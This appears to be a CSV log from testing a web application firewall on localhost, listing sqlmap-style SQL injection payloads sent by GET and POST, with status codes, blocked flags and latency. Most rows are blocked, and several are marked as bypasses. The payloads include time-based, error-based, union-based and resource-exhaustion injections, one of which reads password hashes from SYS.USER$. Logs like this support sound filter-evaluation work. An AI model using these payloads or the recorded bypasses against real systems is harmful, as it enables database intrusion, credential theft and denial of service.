probe_index,source_row,method,payload,url,status,blocked,outcome,request_sent,url_length,latency_ms,attempts,error
3367,5506,POST,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",http://127.0.0.1:18080/,403,True,blocked,True,23,7.184,1,
3368,1739,GET,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++and+8594++%3D++++%28++select+8594+from+pg_sleep++%28++5+++%29++++%29+++--,403,True,blocked,True,133,4.934,1,
3369,1739,POST,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,http://127.0.0.1:18080/,403,True,blocked,True,23,5.63,1,
3370,2541,GET,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://127.0.0.1:18080/?payload=1%27%2B++%28++select+dnxi+where+5850++%3D++5850+or+8156++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--,403,True,blocked,True,187,5.414,1,
3371,2541,POST,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.208,1,
3372,18,GET,1'   )    )    as eymg where 7000  =  7000,http://127.0.0.1:18080/?payload=1%27+++%29++++%29++++as+eymg+where+7000++%3D++7000,403,True,blocked,True,82,5.528,1,
3373,18,POST,1'   )    )    as eymg where 7000  =  7000,http://127.0.0.1:18080/,403,True,blocked,True,23,6.647,1,
3374,3417,GET,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",http://127.0.0.1:18080/?payload=call+regexp_substring++%28++repeat++%28++right++%28++char++%28++3702++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%27gsup%27++%3D++%27gsup,200,False,bypass,True,203,6.448,1,
3375,3417,POST,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",http://127.0.0.1:18080/,200,False,bypass,True,23,6.184,1,
3376,2380,GET,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",http://127.0.0.1:18080/?payload=1%27%2B++%28++select+wkay+where+5476++%3D++5476+and+char++%28++120++%29++%7C%7Cchar++%28++106++%29++%7C%7Cchar++%28++117++%29++%7C%7Cchar++%28++85++%29++++%3D++regexp_substring++%28++repeat++%28++right++%28++char++%28++9981++%29++%2C0++%29++%2C5000000000++%29++%2Cnull+++%29++++%29+++%2B%27,403,True,blocked,True,322,5.09,1,
3377,2380,POST,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",http://127.0.0.1:18080/,403,True,blocked,True,23,5.84,1,
3378,2325,GET,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++and+6537++%3D++dbms_pipe.receive_message++%28++chr++%28++76++%29++%7C%7Cchr++%28++116++%29++%7C%7Cchr++%28++117++%29++%7C%7Cchr++%28++65++%29++%2C5++%29+++and++++%28++++%28+++++%28++%27nsji%27++%3D++%27nsji,403,True,blocked,True,266,4.853,1,
3379,2325,POST,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",http://127.0.0.1:18080/,403,True,blocked,True,23,5.551,1,
3380,3277,GET,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",http://127.0.0.1:18080/?payload=call+regexp_substring++%28++repeat++%28++right++%28++char++%28++3702++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++9348++%3D++9348,200,False,bypass,True,194,5.456,1,
3381,3277,POST,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",http://127.0.0.1:18080/,200,False,bypass,True,23,6.117,1,
3382,5070,GET,"-7255' union all select 2127,2127,2127,2127,2127#",http://127.0.0.1:18080/?payload=-7255%27+union+all+select+2127%2C2127%2C2127%2C2127%2C2127%23,403,True,blocked,True,93,5.277,1,
3383,5070,POST,"-7255' union all select 2127,2127,2127,2127,2127#",http://127.0.0.1:18080/,403,True,blocked,True,23,5.528,1,
3384,5173,GET,1'  )   where 5871  =  5871,http://127.0.0.1:18080/?payload=1%27++%29+++where+5871++%3D++5871,200,False,bypass,True,65,5.507,1,
3385,5173,POST,1'  )   where 5871  =  5871,http://127.0.0.1:18080/,200,False,bypass,True,23,6.549,1,
3386,3736,GET,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,http://127.0.0.1:18080/?payload=select+++%28++case+when+++%28++4666++%3D++4666++%29+++then+1+else+4666%2A++%28++select+4666+from+master..sysdatabases++%29+++end++%29++--,403,True,blocked,True,169,5.822,1,
3387,3736,POST,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,http://127.0.0.1:18080/,403,True,blocked,True,23,5.437,1,
3388,2493,GET,"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://127.0.0.1:18080/?payload=1%27++%29+++where+7587++%3D++7587+or+8421++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--,403,True,blocked,True,173,4.717,1,
3389,2493,POST,"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.621,1,
3390,1793,GET,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++or+7552++%3D++++%28++select+count++%28++%2A++%29+++from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4++%29+++and++++%28++++%28+++++%28++%27nqam%27++%3D++%27nqam,403,True,blocked,True,262,5.486,1,
3391,1793,POST,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",http://127.0.0.1:18080/,403,True,blocked,True,23,6.134,1,
3392,5895,GET,1  )   as bhdj where 4472  =  4472,http://127.0.0.1:18080/?payload=1++%29+++as+bhdj+where+4472++%3D++4472,403,True,blocked,True,70,4.885,1,
3393,5895,POST,1  )   as bhdj where 4472  =  4472,http://127.0.0.1:18080/,403,True,blocked,True,23,5.417,1,
3394,273,GET, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,http://127.0.0.1:18080/?payload=+AND+1++%3D++utl_inaddr.get_host_address+++%28++++%28+++SELECT+COUNT++%28++DISTINCT++%28++PASSWORD+++%29++++%29++++FROM+SYS.USER%24+++%29++++%29++++AND+%27i%27++%3D++%27i,403,True,blocked,True,202,5.725,1,
3395,273,POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,http://127.0.0.1:18080/,403,True,blocked,True,23,6.64,1,
3396,739,GET,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",http://127.0.0.1:18080/?payload=1%22+++%29++++%29+++++%29+++or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29+++and++++%28++++%28+++++%28++%22jzsb%22++%3D++%22jzsb,403,True,blocked,True,240,5.748,1,
3397,739,POST,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",http://127.0.0.1:18080/,403,True,blocked,True,23,5.962,1,
3398,2862,GET,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/?payload=1%27+where+6902++%3D++6902+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++--,403,True,blocked,True,492,6.47,1,
3399,2862,POST,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,6.387,1,
3400,1866,GET,"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/?payload=1%22++%29+++as+uyms+where+6210++%3D++6210+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++--,403,True,blocked,True,507,5.323,1,
3401,1866,POST,"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.617,1,
3402,4451,GET, select * from users,http://127.0.0.1:18080/?payload=+select+%2A+from+users,200,False,bypass,True,54,6.61,1,
3403,4451,POST, select * from users,http://127.0.0.1:18080/,200,False,bypass,True,23,5.636,1,
3404,1412,GET,waitfor delay '0:0:5' and    (    (   7619  =  7619,http://127.0.0.1:18080/?payload=waitfor+delay+%270%3A0%3A5%27+and++++%28++++%28+++7619++%3D++7619,403,True,blocked,True,97,4.861,1,
3405,1412,POST,waitfor delay '0:0:5' and    (    (   7619  =  7619,http://127.0.0.1:18080/,403,True,blocked,True,23,5.174,1,
3406,3148,GET,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,http://127.0.0.1:18080/?payload=1%27+++%29++++%29++++rlike+sleep++%28++5++%29+++and++++%28++++%28+++%27qitl%27+like+%27qitl,403,True,blocked,True,123,4.924,1,
3407,3148,POST,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,http://127.0.0.1:18080/,403,True,blocked,True,23,4.838,1,
3408,6038,GET,"-4135'   )    )     )   union all select 4413,4413,4413#",http://127.0.0.1:18080/?payload=-4135%27+++%29++++%29+++++%29+++union+all+select+4413%2C4413%2C4413%23,403,True,blocked,True,102,5.445,1,
3409,6038,POST,"-4135'   )    )     )   union all select 4413,4413,4413#",http://127.0.0.1:18080/,403,True,blocked,True,23,5.287,1,
3410,6180,GET,"iif  (  2452  =  8999,1,1/0  )  ",http://127.0.0.1:18080/?payload=iif++%28++2452++%3D++8999%2C1%2C1%2F0++%29++,403,True,blocked,True,76,5.532,1,
3411,6180,POST,"iif  (  2452  =  8999,1,1/0  )  ",http://127.0.0.1:18080/,403,True,blocked,True,23,5.4,1,
3412,2140,GET,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",http://127.0.0.1:18080/?payload=1%22+++%29++++%29+++++%29+++and+char++%28++120++%29++%7C%7Cchar++%28++106++%29++%7C%7Cchar++%28++117++%29++%7C%7Cchar++%28++85++%29++++%3D++regexp_substring++%28++repeat++%28++right++%28++char++%28++9981++%29++%2C0++%29++%2C5000000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%22uqyb%22++%3D++%22uqyb,403,True,blocked,True,339,5.535,1,
3413,2140,POST,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",http://127.0.0.1:18080/,403,True,blocked,True,23,5.692,1,
3414,113,GET,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/?payload=1%27++%29+++as+hlbq+where+2347++%3D++2347+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++--,403,True,blocked,True,507,5.608,1,
3415,113,POST,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.738,1,
3416,3823,GET,"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",http://127.0.0.1:18080/?payload=1%25%27+and+8407++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29++++and+%27%25%27++%3D++%27,403,True,blocked,True,170,5.161,1,
3417,3823,POST,"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",http://127.0.0.1:18080/,403,True,blocked,True,23,5.39,1,
3418,1201,GET,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",http://127.0.0.1:18080/?payload=-1639+++%29++++%29++++or+5023++%3D++ctxsys.drithsx.sn++%28++5023%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++5023++%3D++5023++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29+++and++++%28++++%28+++3318++%3D++3318,403,True,blocked,True,520,5.445,1,
3419,1201,POST,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",http://127.0.0.1:18080/,403,True,blocked,True,23,6.285,1,
3420,4826,GET,1 rlike sleep  (  5  )  # urxh,http://127.0.0.1:18080/?payload=1+rlike+sleep++%28++5++%29++%23+urxh,403,True,blocked,True,68,6.551,1,
3421,4826,POST,1 rlike sleep  (  5  )  # urxh,http://127.0.0.1:18080/,403,True,blocked,True,23,4.658,1,
3422,3970,GET,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",http://127.0.0.1:18080/?payload=select+dbms_pipe.receive_message++%28++chr++%28++112++%29++%7C%7Cchr++%28++70++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++78++%29++%2C5++%29+++from+dual--,403,True,blocked,True,190,5.356,1,
3423,3970,POST,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",http://127.0.0.1:18080/,403,True,blocked,True,23,4.973,1,
3424,5502,GET,"1"" where 9230  =  9230",http://127.0.0.1:18080/?payload=1%22+where+9230++%3D++9230,200,False,bypass,True,58,5.463,1,
3425,5502,POST,"1"" where 9230  =  9230",http://127.0.0.1:18080/,200,False,bypass,True,23,7.503,1,
3426,5984,GET,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",http://127.0.0.1:18080/?payload=1%27%7C%7C++%28++select+%27hwyv%27+from+dual+where+1155++%3D++1155+and+8407++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++++%29++%7C%7C%27,403,True,blocked,True,221,6.105,1,
3427,5984,POST,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",http://127.0.0.1:18080/,403,True,blocked,True,23,5.669,1,
3428,1188,GET,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",http://127.0.0.1:18080/?payload=1%27++%29+++or+extractvalue++%28++1297%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++1297++%3D++1297%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29++++and+++%28++%27tetk%27++%3D++%27tetk,403,True,blocked,True,248,5.523,1,
3429,1188,POST,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",http://127.0.0.1:18080/,403,True,blocked,True,23,6.786,1,
3430,2061,GET,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",http://127.0.0.1:18080/?payload=1%27%2B++%28++select+vohg+where+6383++%3D++6383+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++++%29++++%29+++%2B%27,403,True,blocked,True,526,5.996,1,
3431,2061,POST,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",http://127.0.0.1:18080/,403,True,blocked,True,23,6.525,1,
3432,1477,GET,1  )   as nmlm where 9872  =  9872,http://127.0.0.1:18080/?payload=1++%29+++as+nmlm+where+9872++%3D++9872,403,True,blocked,True,70,5.535,1,
3433,1477,POST,1  )   as nmlm where 9872  =  9872,http://127.0.0.1:18080/,403,True,blocked,True,23,5.807,1,
3434,4586,GET,1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,http://127.0.0.1:18080/?payload=1+++%29++++%29++++as+foul+where+4361++%3D++4361+and+3715+in++++%28++++%28+++char++%28++113++%29++%2Bchar++%28++113++%29++%2Bchar++%28++112++%29++%2Bchar++%28++106++%29++%2Bchar++%28++113++%29++%2B++%28++select+++%28++case+when+++%28++3715++%3D++3715++%29+++then+char++%28++49++%29+++else+char++%28++48++%29+++end+++%29++++%29+++%2Bchar++%28++113++%29++%2Bchar++%28++122++%29++%2Bchar++%28++118++%29++%2Bchar++%28++122++%29++%2Bchar++%28++113+++%29++++%29+++++%29++--,403,True,blocked,True,498,5.559,1,
3435,4586,POST,1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,http://127.0.0.1:18080/,403,True,blocked,True,23,5.879,1,
3436,2977,GET,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",http://127.0.0.1:18080/?payload=1%22+++%29++++%29++++or+sleep++%28++5++%29+++and++++%28++++%28+++%22mtmb%22+like+%22mtmb,403,True,blocked,True,120,5.646,1,
3437,2977,POST,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",http://127.0.0.1:18080/,403,True,blocked,True,23,5.502,1,
3438,5829,GET,"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",http://127.0.0.1:18080/?payload=1%25%22+++%29++++%29+++++%29+++and+8148++%3D++like++%28++%27abcdefg%27%2Cupper++%28++hex++%28++randomblob++%28++500000000%2F2+++%29++++%29++++++%29++++%29+++--,403,True,blocked,True,191,6.052,1,
3439,5829,POST,"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.597,1,
3440,4571,GET,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",http://127.0.0.1:18080/?payload=-1583%27++%29+++or+elt++%28++1032++%3D++1032%2C3623++%29+++and+++%28++%27jrcj%27+like+%27jrcj,403,True,blocked,True,125,4.678,1,
3441,4571,POST,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",http://127.0.0.1:18080/,403,True,blocked,True,23,5.668,1,
3442,757,GET,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",http://127.0.0.1:18080/?payload=-2254%27++%29+++as+dyrv+where+9079++%3D++9079+union+all+select+9079%2C9079%2C9079%2C9079%2C9079%2C9079%2C9079%2C9079%23,403,True,blocked,True,151,4.937,1,
3443,757,POST,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",http://127.0.0.1:18080/,403,True,blocked,True,23,5.468,1,
